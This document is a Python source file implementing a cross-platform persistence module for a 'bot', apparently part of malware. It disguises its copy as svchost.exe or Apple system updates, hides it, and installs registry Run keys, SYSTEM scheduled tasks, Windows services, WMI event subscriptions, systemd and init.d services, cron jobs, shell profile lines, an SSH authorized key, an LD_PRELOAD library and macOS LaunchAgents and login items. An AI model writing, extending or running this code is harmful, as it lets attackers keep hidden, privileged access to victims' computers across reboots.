# persistence.py
import os
import sys
import time
import shutil
import platform
import subprocess
import threading
import json
import base64
import uuid
import stat
import pwd
import grp
from datetime import datetime, timedelta

class PersistenceMechanisms:
    def __init__(self, bot_id=None):
        self.bot_id = bot_id or str(uuid.uuid4())
        self.install_path = None
        self.original_path = os.path.abspath(sys.argv[0])
        self.is_persistent = False
        
    def get_install_path(self):
        """Determine the best installation path based on OS"""
        try:
            system = platform.system()
            
            if system == 'Windows':
                # Windows paths
                appdata = os.environ.get('APPDATA', '')
                localappdata = os.environ.get('LOCALAPPDATA', '')
                programdata = os.environ.get('ProgramData', '')
                
                # Try APPDATA first
                if appdata:
                    path = os.path.join(appdata, 'Microsoft', 'SystemUpdates')
                    if os.path.exists(os.path.dirname(path)):
                        return os.path.join(path, 'svchost.exe')
                
                # Try LOCALAPPDATA
                if localappdata:
                    path = os.path.join(localappdata, 'Microsoft', 'SystemUpdates')
                    if os.path.exists(os.path.dirname(path)):
                        return os.path.join(path, 'svchost.exe')
                
                # Try ProgramData
                if programdata:
                    path = os.path.join(programdata, 'Microsoft', 'SystemUpdates')
                    if os.path.exists(os.path.dirname(path)):
                        return os.path.join(path, 'svchost.exe')
                
                # Default to TEMP
                temp = os.environ.get('TEMP', '')
                if temp:
                    return os.path.join(temp, 'svchost.exe')
                
            elif system == 'Linux':
                # Linux paths
                home = os.path.expanduser('~')
                config = os.path.join(home, '.config')
                
                # Try ~/.config
                if os.path.exists(config):
                    path = os.path.join(config, 'systemd', 'system-update')
                    if os.path.exists(os.path.dirname(path)):
                        return path
                
                # Try /usr/local/bin
                if os.path.exists('/usr/local/bin'):
                    return '/usr/local/bin/system-update'
                
                # Try /opt
                if os.path.exists('/opt'):
                    return '/opt/system-update'
                
                # Default to /tmp
                if os.path.exists('/tmp'):
                    return '/tmp/system-update'
                
            elif system == 'Darwin':
                # macOS paths
                home = os.path.expanduser('~')
                library = os.path.join(home, 'Library')
                
                # Try ~/Library/LaunchAgents
                if os.path.exists(os.path.join(library, 'LaunchAgents')):
                    path = os.path.join(library, 'LaunchAgents', 'com.apple.systemupdate')
                    if os.path.exists(os.path.dirname(path)):
                        return path
                
                # Try /Library/LaunchAgents
                if os.path.exists('/Library/LaunchAgents'):
                    return '/Library/LaunchAgents/com.apple.systemupdate'
                
                # Try /usr/local/bin
                if os.path.exists('/usr/local/bin'):
                    return '/usr/local/bin/system-update'
                
                # Default to /tmp
                if os.path.exists('/tmp'):
                    return '/tmp/system-update'
            
            # Fallback to current directory
            return os.path.join(os.path.dirname(self.original_path), 'system-update')
            
        except Exception as e:
            print(f"Error determining install path: {e}")
            return os.path.join(os.path.dirname(self.original_path), 'system-update')
    
    def install_file(self):
        """Install the bot file to the persistent location"""
        try:
            # Get install path
            self.install_path = self.get_install_path()
            
            # Create directory if it doesn't exist
            install_dir = os.path.dirname(self.install_path)
            if not os.path.exists(install_dir):
                os.makedirs(install_dir)
            
            # Copy file if it doesn't exist or is different
            if not os.path.exists(self.install_path) or \
               os.path.getsize(self.original_path) != os.path.getsize(self.install_path):
                
                # Copy file
                shutil.copy2(self.original_path, self.install_path)
                
                # Set executable permission
                os.chmod(self.install_path, 0o755)
                
                # Set hidden attribute on Windows
                if platform.system() == 'Windows':
                    subprocess.run(['attrib', '+h', '+s', self.install_path], shell=True)
                
                # Set hidden attribute on Linux/macOS
                else:
                    # Rename with a dot prefix to make it hidden
                    hidden_path = os.path.join(install_dir, f'.{os.path.basename(self.install_path)}')
                    if os.path.exists(hidden_path):
                        os.remove(hidden_path)
                    os.rename(self.install_path, hidden_path)
                    self.install_path = hidden_path
            
            return True
            
        except Exception as e:
            print(f"Error installing file: {e}")
            return False
    
    def windows_persistence(self):
        """Establish persistence on Windows"""
        try:
            if not self.install_path:
                return False
            
            # Method 1: Registry Run key
            try:
                import winreg
                
                # Current user Run key
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, self.install_path)
                winreg.CloseKey(key)
                
                print("Added to Current User Run registry key")
            except Exception as e:
                print(f"Error adding to Run registry key: {e}")
            
            # Method 2: Registry RunOnce key
            try:
                import winreg
                
                # Current user RunOnce key
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 
                                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, self.install_path)
                winreg.CloseKey(key)
                
                print("Added to Current User RunOnce registry key")
            except Exception as e:
                print(f"Error adding to RunOnce registry key: {e}")
            
            # Method 3: Scheduled Task
            try:
                task_name = "SystemUpdateService"
                task_command = f'schtasks /create /tn "{task_name}" /tr "{self.install_path}" /sc minute /mo 5 /ru SYSTEM /f'
                subprocess.run(task_command, shell=True, check=True)
                
                print("Created scheduled task")
            except Exception as e:
                print(f"Error creating scheduled task: {e}")
            
            # Method 4: Startup folder
            try:
                startup_path = os.path.join(os.environ['APPDATA'], 
                                           'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                
                if not os.path.exists(startup_path):
                    os.makedirs(startup_path)
                
                shortcut_path = os.path.join(startup_path, 'SystemUpdateService.lnk')
                
                # Create shortcut
                import win32com.client
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(shortcut_path)
                shortcut.Targetpath = self.install_path
                shortcut.WorkingDirectory = os.path.dirname(self.install_path)
                shortcut.IconLocation = "%SystemRoot%\\system32\\shell32.dll,4"
                shortcut.save()
                
                print("Added to Startup folder")
            except Exception as e:
                print(f"Error adding to Startup folder: {e}")
            
            # Method 5: Service installation
            try:
                service_name = "SystemUpdateService"
                service_display_name = "System Update Service"
                service_description = "Manages system updates and security patches"
                
                # Create service
                sc_command = f'sc create "{service_name}" binPath= "{self.install_path}" start= auto DisplayName= "{service_display_name}"'
                subprocess.run(sc_command, shell=True, check=True)
                
                # Set service description
                sc_command = f'sc description "{service_name}" "{service_description}"'
                subprocess.run(sc_command, shell=True, check=True)
                
                # Start service
                sc_command = f'sc start "{service_name}"'
                subprocess.run(sc_command, shell=True, check=True)
                
                print("Created Windows service")
            except Exception as e:
                print(f"Error creating Windows service: {e}")
            
            # Method 6: WMI event subscription
            try:
                # Create WMI event filter
                filter_query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 5"
                filter_name = "SystemUpdateFilter"
                
                ps_command = f"""
                $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                    EventNamespace = "root\\cimv2";
                    QueryLanguage = "WQL";
                    Query = "{filter_query}";
                    Name = "{filter_name}";
                    EventName = "SystemUpdateEvent"
                }}
                """
                subprocess.run(['powershell', '-Command', ps_command], shell=True, check=True)
                
                # Create WMI event consumer
                consumer_name = "SystemUpdateConsumer"
                consumer_path = self.install_path
                
                ps_command = f"""
                $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                    Name = "{consumer_name}";
                    ExecutablePath = "{consumer_path}";
                    CommandLineTemplate = "{consumer_path}"
                }}
                """
                subprocess.run(['powershell', '-Command', ps_command], shell=True, check=True)
                
                # Bind filter and consumer
                binding_name = "SystemUpdateBinding"
                
                ps_command = f"""
                $Filter = Get-WmiObject -Class __EventFilter -Namespace "root\\subscription" | Where-Object {{$_.Name -eq "{filter_name}"}}
                $Consumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\\subscription" | Where-Object {{$_.Name -eq "{consumer_name}"}}
                Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                    Filter = $Filter;
                    Consumer = $Consumer;
                    Name = "{binding_name}"
                }}
                """
                subprocess.run(['powershell', '-Command', ps_command], shell=True, check=True)
                
                print("Created WMI event subscription")
            except Exception as e:
                print(f"Error creating WMI event subscription: {e}")
            
            return True
            
        except Exception as e:
            print(f"Error establishing Windows persistence: {e}")
            return False
    
    def linux_persistence(self):
        """Establish persistence on Linux"""
        try:
            if not self.install_path:
                return False
            
            # Method 1: systemd service
            try:
                service_name = "system-update"
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={self.install_path}
Restart=always
RestartSec=10
User=root
Group=root

[Install]
WantedBy=multi-user.target
"""
                
                service_path = f'/etc/systemd/system/{service_name}.service'
                with open(service_path, 'w') as f:
                    f.write(service_content)
                
                # Enable and start service
                subprocess.run(['systemctl', 'enable', service_name], check=True)
                subprocess.run(['systemctl', 'start', service_name], check=True)
                
                print("Created systemd service")
            except Exception as e:
                print(f"Error creating systemd service: {e}")
            
            # Method 2: cron job
            try:
                cron_content = f"*/5 * * * * {self.install_path}\n"
                
                # Add to root crontab
                subprocess.run(['crontab', '-l'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(['crontab', '-'], input=cron_content.encode(), check=True)
                
                print("Added to root crontab")
            except Exception as e:
                print(f"Error adding to crontab: {e}")
            
            # Method 3: init.d script
            try:
                script_name = "system-update"
                script_content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {script_name}
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       Manages system updates and security patches
### END INIT INFO

. /lib/lsb/init-functions

case "$1" in
    start)
        log_daemon_msg "Starting System Update Service" "{script_name}"
        {self.install_path} &
        log_end_msg $?
        ;;
    stop)
        log_daemon_msg "Stopping System Update Service" "{script_name}"
        pkill -f {self.install_path}
        log_end_msg $?
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart}}"
        exit 1
        ;;
esac

exit 0
"""
                
                script_path = f'/etc/init.d/{script_name}'
                with open(script_path, 'w') as f:
                    f.write(script_content)
                
                # Make executable
                os.chmod(script_path, 0o755)
                
                # Enable service
                subprocess.run(['update-rc.d', script_name, 'defaults'], check=True)
                subprocess.run(['service', script_name, 'start'], check=True)
                
                print("Created init.d script")
            except Exception as e:
                print(f"Error creating init.d script: {e}")
            
            # Method 4: .profile or .bashrc
            try:
                home = os.path.expanduser('~')
                
                # Add to .profile
                profile_path = os.path.join(home, '.profile')
                with open(profile_path, 'a') as f:
                    f.write(f"\n# System Update Service\n{self.install_path} &\n")
                
                # Add to .bashrc
                bashrc_path = os.path.join(home, '.bashrc')
                with open(bashrc_path, 'a') as f:
                    f.write(f"\n# System Update Service\n{self.install_path} &\n")
                
                print("Added to .profile and .bashrc")
            except Exception as e:
                print(f"Error adding to .profile/.bashrc: {e}")
            
            # Method 5: SSH authorized_keys
            try:
                home = os.path.expanduser('~')
                ssh_dir = os.path.join(home, '.ssh')
                
                if not os.path.exists(ssh_dir):
                    os.makedirs(ssh_dir)
                    os.chmod(ssh_dir, 0o700)
                
                auth_keys_path = os.path.join(ssh_dir, 'authorized_keys')
                
                # Generate SSH key pair
                key_path = os.path.join(ssh_dir, 'id_rsa')
                if not os.path.exists(key_path):
                    subprocess.run(['ssh-keygen', '-t', 'rsa', '-N', '', '-f', key_path], check=True)
                
                # Add public key to authorized_keys
                with open(key_path + '.pub', 'r') as f:
                    public_key = f.read().strip()
                
                if os.path.exists(auth_keys_path):
                    with open(auth_keys_path, 'r') as f:
                        auth_keys = f.read()
                    
                    if public_key not in auth_keys:
                        with open(auth_keys_path, 'a') as f:
                            f.write(f'\n{public_key}\n')
                else:
                    with open(auth_keys_path, 'w') as f:
                        f.write(f'{public_key}\n')
                
                os.chmod(auth_keys_path, 0o600)
                
                print("Added SSH authorized key")
            except Exception as e:
                print(f"Error adding SSH authorized key: {e}")
            
            # Method 6: LD_PRELOAD
            try:
                # Create malicious shared library
                lib_name = "libsystem_update.so"
                lib_path = os.path.join(os.path.dirname(self.install_path), lib_name)
                
                # Simple C code for the shared library
                c_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

static void (*original_init)(void) = NULL;

void __attribute__((constructor)) my_init(void) {{
    // Run the bot
    system("{self.install_path} &");
    
    // Call the original constructor if it exists
    if (original_init) {{
        original_init();
    }}
}}
"""
                
                # Compile the shared library
                with open('/tmp/libsystem_update.c', 'w') as f:
                    f.write(c_code)
                
                subprocess.run(['gcc', '-shared', '-fPIC', '-o', lib_path, '/tmp/libsystem_update.c'], check=True)
                
                # Add LD_PRELOAD to profile
                home = os.path.expanduser('~')
                profile_path = os.path.join(home, '.profile')
                with open(profile_path, 'a') as f:
                    f.write(f"\nexport LD_PRELOAD={lib_path}\n")
                
                # Clean up
                os.remove('/tmp/libsystem_update.c')
                
                print("Created LD_PRELOAD shared library")
            except Exception as e:
                print(f"Error creating LD_PRELOAD shared library: {e}")
            
            return True
            
        except Exception as e:
            print(f"Error establishing Linux persistence: {e}")
            return False
    
    def macos_persistence(self):
        """Establish persistence on macOS"""
        try:
            if not self.install_path:
                return False
            
            # Method 1: LaunchAgent
            try:
                agent_name = "com.apple.systemupdate"
                agent_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.install_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
"""
                
                # User LaunchAgent
                home = os.path.expanduser('~')
                agent_dir = os.path.join(home, 'Library', 'LaunchAgents')
                
                if not os.path.exists(agent_dir):
                    os.makedirs(agent_dir)
                
                agent_path = os.path.join(agent_dir, f'{agent_name}.plist')
                with open(agent_path, 'w') as f:
                    f.write(agent_content)
                
                # Load agent
                subprocess.run(['launchctl', 'load', agent_path], check=True)
                
                print("Created user LaunchAgent")
            except Exception as e:
                print(f"Error creating user LaunchAgent: {e}")
            
            # Method 2: LaunchDaemon
            try:
                daemon_name = "com.apple.systemupdate"
                daemon_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{daemon_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.install_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
"""
                
                # System LaunchDaemon
                daemon_dir = '/Library/LaunchDaemons'
                
                if not os.path.exists(daemon_dir):
                    os.makedirs(daemon_dir)
                
                daemon_path = os.path.join(daemon_dir, f'{daemon_name}.plist')
                with open(daemon_path, 'w') as f:
                    f.write(daemon_content)
                
                # Load daemon
                subprocess.run(['launchctl', 'load', daemon_path], check=True)
                
                print("Created system LaunchDaemon")
            except Exception as e:
                print(f"Error creating system LaunchDaemon: {e}")
            
            # Method 3: cron job
            try:
                cron_content = f"*/5 * * * * {self.install_path}\n"
                
                # Add to crontab
                subprocess.run(['crontab', '-l'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                subprocess.run(['crontab', '-'], input=cron_content.encode(), check=True)
                
                print("Added to crontab")
            except Exception as e:
                print(f"Error adding to crontab: {e}")
            
            # Method 4: Login items
            try:
                # Use osascript to add login item
                script = f'''
                tell application "System Events"
                    make login item at end with properties {{path:"{self.install_path}", hidden:false}}
                end tell
                '''
                
                subprocess.run(['osascript', '-e', script], check=True)
                
                print("Added to login items")
            except Exception as e:
                print(f"Error adding to login items: {e}")
            
            # Method 5: .profile or .bashrc
            try:
                home = os.path.expanduser('~')
                
                # Add to .profile
                profile_path = os.path.join(home, '.profile')
                with open(profile_path, 'a') as f:
                    f.write(f"\n# System Update Service\n{self.install_path} &\n")
                
                # Add to .bashrc
                bashrc_path = os.path.join(home, '.bashrc')
                with open(bashrc_path, 'a') as f:
                    f.write(f"\n# System Update Service\n{self.install_path} &\n")
                
                print("Added to .profile and .bashrc")
            except Exception as e:
                print(f"Error adding to .profile/.bashrc: {e}")
            
            return True
            
        except Exception as e:
            print(f"Error establishing macOS persistence: {e}")
            return False
    
    def establish_persistence(self):
        """Establish persistence based on the operating system"""
        try:
            # Install file
            if not self.install_file():
                return False
            
            # Get OS
            system = platform.system()
            
            # Establish persistence based on OS
            if system == 'Windows':
                result = self.windows_persistence()
            elif system == 'Linux':
                result = self.linux_persistence()
            elif system == 'Darwin':
                result = self.macos_persistence()
            else:
                print(f"Unsupported operating system: {system}")
                return False
            
            if result:
                self.is_persistent = True
                print("Persistence established successfully")
                
                # Execute the installed version if different from current
                if self.original_path != self.install_path:
                    subprocess.Popen([self.install_path])
                    sys.exit(0)
                
                return True
            else:
                print("Failed to establish persistence")
                return False
                
        except Exception as e:
            print(f"Error establishing persistence: {e}")
            return False
    
    def check_persistence(self):
        """Check if persistence is established"""
        try:
            system = platform.system()
            
            if system == 'Windows':
                try:
                    import winreg
                    
                    # Check Run key
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_READ)
                    
                    try:
                        value, _ = winreg.QueryValueEx(key, "SystemUpdateService")
                        if value == self.install_path:
                            return True
                    except:
                        pass
                    
                    winreg.CloseKey(key)
                    
                    # Check scheduled task
                    try:
                        result = subprocess.run(['schtasks', '/query', '/tn', 'SystemUpdateService'], 
                                              shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if result.returncode == 0:
                            return True
                    except:
                        pass
                    
                except Exception as e:
                    print(f"Error checking Windows persistence: {e}")
            
            elif system == 'Linux':
                try:
                    # Check systemd service
                    try:
                        result = subprocess.run(['systemctl', 'is-active', 'system-update'], 
                                              shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if result.returncode == 0:
                            return True
                    except:
                        pass
                    
                    # Check crontab
                    try:
                        result = subprocess.run(['crontab', '-l'], 
                                              shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        if self.install_path in result.stdout.decode():
                            return True
                    except:
                        pass
                    
                except Exception as e:
                    print(f"Error checking Linux persistence: {e}")
            
            elif system == 'Darwin':
                try:
                    # Check LaunchAgent
                    home = os.path.expanduser('~')
                    agent_path = os.path.join(home, 'Library', 'LaunchAgents', 'com.apple.systemupdate.plist')
                    
                    if os.path.exists(agent_path):
                        return True
                    
                    # Check LaunchDaemon
                    daemon_path = '/Library/LaunchDaemons/com.apple.systemupdate.plist'
                    
                    if os.path.exists(daemon_path):
                        return True
                    
                except Exception as e:
                    print(f"Error checking macOS persistence: {e}")
            
            return False
            
        except Exception as e:
            print(f"Error checking persistence: {e}")
            return False
    
    def remove_persistence(self):
        """Remove persistence mechanisms"""
        try:
            system = platform.system()
            
            if system == 'Windows':
                try:
                    import winreg
                    
                    # Remove Run key
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    
                    try:
                        winreg.DeleteValue(key, "SystemUpdateService")
                    except:
                        pass
                    
                    winreg.CloseKey(key)
                    
                    # Remove RunOnce key
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 
                                        0, winreg.KEY_SET_VALUE)
                    
                    try:
                        winreg.DeleteValue(key, "SystemUpdateService")
                    except:
                        pass
                    
                    winreg.CloseKey(key)
                    
                    # Remove scheduled task
                    try:
                        subprocess.run(['schtasks', '/delete', '/tn', 'SystemUpdateService', '/f'], 
                                      shell=True, check=True)
                    except:
                        pass
                    
                    # Remove startup folder shortcut
                    try:
                        startup_path = os.path.join(os.environ['APPDATA'], 
                                                   'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                        shortcut_path = os.path.join(startup_path, 'SystemUpdateService.lnk')
                        
                        if os.path.exists(shortcut_path):
                            os.remove(shortcut_path)
                    except:
                        pass
                    
                    # Remove service
                    try:
                        subprocess.run(['sc', 'stop', 'SystemUpdateService'], shell=True)
                        subprocess.run(['sc', 'delete', 'SystemUpdateService'], shell=True)
                    except:
                        pass
                    
                    # Remove WMI event subscription
                    try:
                        ps_command = """
                        $Filter = Get-WmiObject -Class __EventFilter -Namespace "root\\subscription" | Where-Object {$_.Name -eq "SystemUpdateFilter"}
                        $Consumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\\subscription" | Where-Object {$_.Name -eq "SystemUpdateConsumer"}
                        $Binding = Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\\subscription" | Where-Object {$_.Filter -eq $Filter -and $_.Consumer -eq $Consumer}
                        
                        if ($Binding) {{$Binding | Remove-WmiObject}}
                        if ($Consumer) {{$Consumer | Remove-WmiObject}}
                        if ($Filter) {{$Filter | Remove-WmiObject}}
                        """
                        subprocess.run(['powershell', '-Command', ps_command], shell=True)
                    except:
                        pass
                    
                except Exception as e:
                    print(f"Error removing Windows persistence: {e}")
            
            elif system == 'Linux':
                try:
                    # Remove systemd service
                    try:
                        subprocess.run(['systemctl', 'stop', 'system-update'], check=True)
                        subprocess.run(['systemctl', 'disable', 'system-update'], check=True)
                        os.remove('/etc/systemd/system/system-update.service')
                        subprocess.run(['systemctl', 'daemon-reload'], check=True)
                    except:
                        pass
                    
                    # Remove crontab entry
                    try:
                        result = subprocess.run(['crontab', '-l'], 
                                              shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        crontab_content = result.stdout.decode()
                        
                        # Remove bot entry
                        new_crontab = '\n'.join([line for line in crontab_content.split('\n') 
                                                 if self.install_path not in line])
                        
                        subprocess.run(['crontab', '-'], input=new_crontab.encode(), check=True)
                    except:
                        pass
                    
                    # Remove init.d script
                    try:
                        subprocess.run(['service', 'system-update', 'stop'], check=True)
                        subprocess.run(['update-rc.d', 'system-update', 'remove'], check=True)
                        os.remove('/etc/init.d/system-update')
                    except:
                        pass
                    
                except Exception as e:
                    print(f"Error removing Linux persistence: {e}")
            
            elif system == 'Darwin':
                try:
                    # Remove LaunchAgent
                    home = os.path.expanduser('~')
                    agent_path = os.path.join(home, 'Library', 'LaunchAgents', 'com.apple.systemupdate.plist')
                    
                    if os.path.exists(agent_path):
                        subprocess.run(['launchctl', 'unload', agent_path], check=True)
                        os.remove(agent_path)
                    
                    # Remove LaunchDaemon
                    daemon_path = '/Library/LaunchDaemons/com.apple.systemupdate.plist'
                    
                    if os.path.exists(daemon_path):
                        subprocess.run(['launchctl', 'unload', daemon_path], check=True)
                        os.remove(daemon_path)
                    
                    # Remove crontab entry
                    try:
                        result = subprocess.run(['crontab', '-l'], 
                                              shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        crontab_content = result.stdout.decode()
                        
                        # Remove bot entry
                        new_crontab = '\n'.join([line for line in crontab_content.split('\n') 
                                                 if self.install_path not in line])
                        
                        subprocess.run(['crontab', '-'], input=new_crontab.encode(), check=True)
                    except:
                        pass
                    
                except Exception as e:
                    print(f"Error removing macOS persistence: {e}")
            
            # Remove installed file
            try:
                if self.install_path and os.path.exists(self.install_path):
                    os.remove(self.install_path)
            except:
                pass
            
            self.is_persistent = False
            print("Persistence removed successfully")
            return True
            
        except Exception as e:
            print(f"Error removing persistence: {e}")
            return False

# Main execution
if __name__ == "__main__":
    persistence = PersistenceMechanisms()
    persistence.establish_persistence()
